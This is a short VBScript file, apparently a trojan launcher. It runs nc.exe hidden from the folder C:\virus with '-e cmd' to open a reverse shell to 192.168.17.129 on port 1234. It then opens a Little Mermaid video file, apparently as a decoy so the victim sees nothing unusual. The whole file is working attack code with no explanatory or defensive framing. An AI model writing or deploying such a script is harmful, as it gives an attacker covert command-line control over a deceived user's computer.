

set shell=CreateObject("Shell.Application")
' shell.ShellExecute "application", "arguments", "path", "verb", window
shell.ShellExecute  "nc.exe","-e cmd 192.168.17.129 1234","C:\virus", , 0
set shell=nothing 

CreateObject("WScript.Shell").Run("""C:\virus\La Sirenetta - In fondo al mar.wmv""")


